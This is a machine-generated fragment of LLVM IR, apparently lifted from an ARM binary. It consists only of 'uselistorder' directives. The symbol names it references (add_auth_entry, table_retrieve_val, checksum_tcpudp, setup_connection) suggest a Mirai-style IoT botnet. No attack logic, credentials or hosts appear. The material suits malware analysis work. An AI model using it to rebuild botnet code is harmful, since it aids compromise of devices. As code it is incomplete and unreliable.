  uselistorder i1 %v7_11168, { 1, 0 }
  uselistorder i1 %v7_11160, { 1, 0 }
  uselistorder i1 %v7_11158, { 1, 0 }
  uselistorder i1 %v7_11144, { 1, 0 }
  uselistorder i1 %v7_1113c, { 1, 0 }
  uselistorder i1 %v7_11134, { 1, 0 }
  uselistorder i1 %v8_1112c, { 1, 0 }
  uselistorder i32 %v1_11114, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_110b0, { 1, 0 }
  uselistorder i8 %v3_110a8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_110a0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_110a0, { 0, 2, 1 }
  uselistorder i32 %v0_11098, { 1, 0 }
  uselistorder i1 %v7_11094, { 1, 0 }
  uselistorder i1 %v7_1108c, { 1, 0 }
  uselistorder i1 %v7_11084, { 1, 0 }
  uselistorder i1 %v7_11070, { 1, 0 }
  uselistorder i1 %v7_11068, { 1, 0 }
  uselistorder i1 %v7_11060, { 1, 0 }
  uselistorder i1 %v8_11058, { 1, 0 }
  uselistorder i32 %v1_11040, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10fdc, { 1, 0 }
  uselistorder i8 %v3_10fd4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10fcc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10fcc, { 0, 2, 1 }
  uselistorder i32 %v0_10fc4, { 1, 0 }
  uselistorder i1 %v7_10fc0, { 1, 0 }
  uselistorder i1 %v7_10fb8, { 1, 0 }
  uselistorder i1 %v7_10fb0, { 1, 0 }
  uselistorder i1 %v7_10f9c, { 1, 0 }
  uselistorder i1 %v7_10f94, { 1, 0 }
  uselistorder i1 %v7_10f8c, { 1, 0 }
  uselistorder i1 %v8_10f84, { 1, 0 }
  uselistorder i32 %v1_10f6c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10f08, { 1, 0 }
  uselistorder i8 %v3_10f00, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10ef8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10ef8, { 0, 2, 1 }
  uselistorder i32 %v0_10ef0, { 1, 0 }
  uselistorder i1 %v7_10eec, { 1, 0 }
  uselistorder i1 %v7_10ee4, { 1, 0 }
  uselistorder i1 %v7_10edc, { 1, 0 }
  uselistorder i1 %v7_10ec8, { 1, 0 }
  uselistorder i1 %v7_10ec0, { 1, 0 }
  uselistorder i1 %v7_10eb8, { 1, 0 }
  uselistorder i1 %v8_10eb0, { 1, 0 }
  uselistorder i32 %v1_10e98, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_10e84, { 1, 2, 0 }
  uselistorder i32 %v2_10e70, { 1, 0 }
  uselistorder i32 %v0_10e70, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_10e6c, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_10e44, { 2, 1, 0 }
  uselistorder i1 %v7_10e20, { 1, 0 }
  uselistorder i32 %v4_10e1c, { 1, 0, 2 }
  uselistorder i32 %v1_10ddc, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_10db8, { 1, 0 }
  uselistorder i32 %v1_10dac, { 2, 1, 0 }
  uselistorder i32 %v1_10da8, { 1, 0 }
  uselistorder i32 %v0_10d4c, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_10d28, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10d24, { 1, 0 }
  uselistorder i32 %v4_10d08, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_10cf4, { 1, 0, 2 }
  uselistorder i32 %v3_10cf0, { 1, 0, 2 }
  uselistorder i32 %v0_116f8, { 1, 0, 2 }
  uselistorder i32 %v3_10cbc, { 1, 0 }
  uselistorder i32 %v1_10ca0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_10c9c, { 1, 0 }
  uselistorder i32 %v3_10c94, { 1, 2, 0 }
  uselistorder i1 %v7_10c80, { 1, 0 }
  uselistorder i32 %v3_10c7c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_10c70, { 1, 0 }
  uselistorder i32 %v2_11684, { 1, 0, 2, 3 }
  uselistorder i32* %v2_11364, { 1, 2, 3, 0 }
  uselistorder i32 %v2_1135c, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_11348, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_11594, { 1, 0 }
  uselistorder i32 %v1_10c20, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10c20, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10bec, { 2, 1, 0 }
  uselistorder i32 %v1_10be8, { 1, 0 }
  uselistorder i1 %v2_10bc8, { 1, 0, 2 }
  uselistorder i32 %v0_10bc4, { 1, 0, 2 }
  uselistorder i1 %v7_10b90, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_10b90, { 1, 0, 2 }
  uselistorder i32 %v2_10b88, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10b7c, { 1, 0, 2 }
  uselistorder i32 %v0_10b80, { 1, 0 }
  uselistorder i32 %v1_10b64, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10b58, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10b58, { 0, 2, 1 }
  uselistorder i32 %v1_10b48, { 1, 0 }
  uselistorder i32 %v3_11920, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_11930, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_10a98, { 1, 0 }
  uselistorder i32 %v1_10a80, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10a8c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10a3c, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_10a30, { 2, 1, 0 }
  uselistorder i32 %v1_10a10, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_109ec, { 1, 0 }
  uselistorder i1 %v9_109b8, { 1, 0 }
  uselistorder i32 %v0_10968, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1090c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_108bc, { 1, 0 }
  uselistorder i32 %v5_10854, { 1, 0 }
  uselistorder i1 %v2_1079c, { 1, 0 }
  uselistorder i1 %v3_10780, { 1, 0, 2 }
  uselistorder i1 %v2_1076c, { 1, 0 }
  uselistorder i1 %v2_10748, { 1, 0 }
  uselistorder i32 %v1_106f8, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_106e4, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_106e0, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_106c8, { 1, 0 }
  uselistorder i32 %v0_106a0, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_f9d8.le, { 0, 2, 1 }
  uselistorder i32 %v0_f9bc, { 3, 2, 0, 1 }
  uselistorder i1 %v7_f95c, { 1, 0 }
  uselistorder i32 %v3_f954, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f940, { 1, 0 }
  uselistorder i32 %v0_f910, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_f5c0, { 3, 1, 2, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 62, 63, 64, 65, 66, 67, 68, 73, 74, 69, 75, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 23, 86, 0, 70, 71, 24, 25, 26, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 72, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 155, 156, 115, 116, 157, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 154, 133, 134, 135, 136, 138, 137, 140, 139, 153, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152 }
  uselistorder i32* %r2.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 51, 52, 53, 54, 10, 0, 46, 47, 11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 48, 49, 240, 244, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 235, 238, 67, 68, 70, 69, 66, 291, 71, 292, 72, 293, 294, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 295, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 236, 237, 239, 241, 242, 243, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290 }
  uselistorder i32* %r1.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 54, 46, 47, 48, 49, 55, 56, 57, 8, 1, 2, 50, 51, 9, 10, 0, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 275, 276, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 219, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 277, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274 }
  uselistorder i32* %r0.global-to-local, {}
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 127, 108, 109, 122, 123, 128, 129, 141, 220, 208, 31, 32, 34, 110, 216, 112, 114, 115, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 217, 113, 19, 20, 25, 21, 22, 23, 24, 26, 27, 28, 29, 30, 33, 111, 35, 41, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 51, 52, 53, 48, 49, 50, 54, 55, 56, 57, 58, 59, 63, 64, 65, 60, 61, 62, 66, 67, 68, 69, 70, 71, 75, 76, 77, 72, 73, 74, 78, 79, 80, 81, 82, 83, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 130, 132, 131, 133, 134, 135, 136, 137, 138, 139, 140, 218, 219, 142, 143, 144, 145, 146, 147, 148, 149, 150, 153, 155, 156, 154, 151, 152, 124, 125, 120, 157, 121, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 215, 190, 191, 192, 193, 194, 214, 195, 196, 197, 213, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 209, 210, 211, 126, 212 }
  uselistorder i1* %cpsr_c.global-to-local, { 123, 106, 107, 124, 118, 119, 125, 137, 213, 201, 29, 30, 32, 108, 0, 109, 111, 112, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 210, 110, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 31, 209, 33, 39, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 49, 50, 51, 46, 47, 48, 52, 53, 54, 55, 56, 57, 61, 62, 63, 58, 59, 60, 64, 65, 66, 67, 68, 69, 73, 74, 75, 70, 71, 72, 76, 77, 78, 79, 80, 81, 85, 86, 87, 82, 83, 84, 88, 89, 90, 91, 92, 93, 97, 98, 99, 94, 95, 96, 100, 101, 102, 103, 104, 105, 113, 114, 115, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 211, 212, 138, 139, 140, 141, 142, 143, 144, 147, 149, 150, 148, 145, 146, 120, 121, 116, 151, 117, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 208, 182, 183, 184, 185, 186, 207, 187, 188, 189, 206, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 122, 205 }
  uselistorder i32 ptrtoint (i16** @global_var_2716c.115 to i32), { 3, 0, 1, 2 }
  uselistorder i16** @global_var_24698.169, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_24698.169 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3, 6 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 12, 11, 10, 9, 8, 7, 6, 28, 24, 23, 27, 26, 25, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i32)* @table_lock_val, { 27, 36, 35, 26, 37, 34, 33, 32, 31, 30, 29, 28, 25, 8, 6, 5, 4, 7, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 24, 23, 22, 21, 20, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 23, 21, 24, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 32, 34, 35, 36, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 11, 12, 13, 14, 15, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 (i32)* @table_unlock_val, { 38, 37, 46, 45, 44, 43, 42, 41, 40, 39, 36, 20, 18, 17, 16, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 35, 34, 33, 32, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10 }
  uselistorder i8 2, { 0, 3, 2, 1 }
  uselistorder i8 5, { 12, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 11, 13, 10 }
  uselistorder i32 39, { 5, 1, 0, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 54, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b96c.524 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b844.474 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b80c.462 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b7d0.446 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b7b0.438 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b7a8.436 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b770.420 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b760.416 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b758.414 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b73c.406 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b6ac.376 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b6a4.372 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b680.364 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b634.346 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b5d4.320 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b574.298 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4f8.270 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b45c.236 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b43c.230 to i32), { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b578.226 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), { 1, 7, 2, 8, 0, 9, 3, 4, 5, 10, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1b40c.218 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b804.214 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3f0.210 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), { 0, 6, 3, 7, 1, 8, 2, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), { 7, 46, 8, 47, 9, 48, 10, 49, 0, 50, 11, 51, 12, 52, 13, 53, 1, 54, 2, 55, 3, 56, 14, 57, 4, 58, 15, 59, 5, 60, 16, 61, 17, 62, 18, 63, 6, 64, 19, 65, 20, 66, 21, 67, 22, 68, 23, 69, 24, 70, 25, 71, 26, 72, 27, 73, 28, 74, 29, 75, 30, 76, 31, 77, 32, 78, 33, 79, 34, 80, 35, 81, 36, 82, 37, 83, 38, 84, 39, 85, 40, 86, 41, 42, 43, 87, 44, 88, 45, 89 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), { 6, 56, 7, 57, 8, 58, 9, 59, 0, 60, 10, 61, 1, 62, 11, 63, 2, 64, 12, 65, 13, 66, 14, 67, 3, 68, 15, 69, 16, 70, 17, 71, 18, 72, 19, 73, 20, 74, 4, 75, 21, 76, 22, 77, 23, 78, 24, 79, 25, 80, 26, 81, 27, 82, 28, 83, 29, 84, 30, 85, 31, 86, 32, 87, 33, 88, 34, 89, 35, 90, 36, 91, 37, 92, 38, 93, 39, 94, 40, 95, 41, 96, 42, 97, 43, 98, 44, 45, 46, 99, 47, 100, 48, 101, 49, 102, 50, 103, 51, 104, 5, 105, 52, 106, 53, 107, 54, 108, 55, 109 }
  uselistorder i32 ptrtoint (i32* @global_var_1b384.190 to i32), { 4, 16, 5, 17, 6, 18, 0, 19, 1, 20, 7, 21, 2, 22, 8, 23, 9, 24, 10, 25, 11, 26, 12, 27, 13, 28, 14, 29, 15, 30, 3, 31 }
  uselistorder i8* @global_var_2468d.187, { 1, 0 }
  uselistorder i16* @global_var_24682.186, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i8 6, { 5, 3, 6, 7, 8, 9, 4, 10, 0, 11, 1, 2 }
